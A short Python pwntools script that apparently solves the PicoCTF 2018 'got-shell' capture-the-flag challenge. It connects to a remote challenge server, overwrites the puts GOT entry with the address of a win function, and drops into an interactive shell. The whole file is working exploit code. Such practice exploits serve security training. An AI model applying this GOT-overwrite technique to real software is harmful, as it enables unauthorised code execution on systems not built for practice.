from pwn import *

#context.log_level = 'debug'

#p = process('./PicoCTF_2018_got-shell')
p = remote('node4.buuoj.cn', 26845)
elf = ELF('./PicoCTF_2018_got-shell')

puts_got = elf.got['puts']
win = elf.sym['win']

p.sendlineafter(b'byte value?\n', hex(puts_got)[2:].encode())
p.sendlineafter(b'to 0x', hex(win)[2:].encode())

p.recv()
p.recv()
p.interactive()